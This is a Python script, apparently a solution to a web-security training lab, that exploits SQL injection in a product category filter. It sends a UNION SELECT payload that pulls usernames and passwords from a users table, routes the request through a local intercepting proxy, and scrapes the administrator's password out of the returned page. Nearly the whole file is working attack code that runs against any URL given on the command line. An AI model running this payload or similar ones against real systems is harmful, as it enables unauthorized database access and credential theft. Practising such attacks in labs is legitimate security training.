import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def find_username_password(url):
    path = "/filter?category=Gifts"
    payload = "' UNION SELECT username, Password FROM users --"

    r = requests.get(url+path+payload, verify=False, proxies=proxies);
    res = r.text;

    if 'administrator' in res:
        soup = BeautifulSoup(r.text, 'html.parser')
        password = soup.body.find(text="administrator").parent.findNext('td').contents[0]
        print("[+] username = administrator")
        print("[+] password = %s" %password)
        return True
    
    return False

proxies = {
    'http' : 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
    }

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] %s input invaid" %sys.orig_argv[0])
        sys.exit(-1)
    
    # to find the no of column and which column contain string type data run 
    #   1. "../unionAttack/unionAttackFindNoOfColumn.py"
    #   2. "../unionAttack/unionAttacksFrindStringColumn.py"

    print("dumping the payload to check for username and password...")
    if not find_username_password(url):
        print("[-] 'administrator' username and password not found")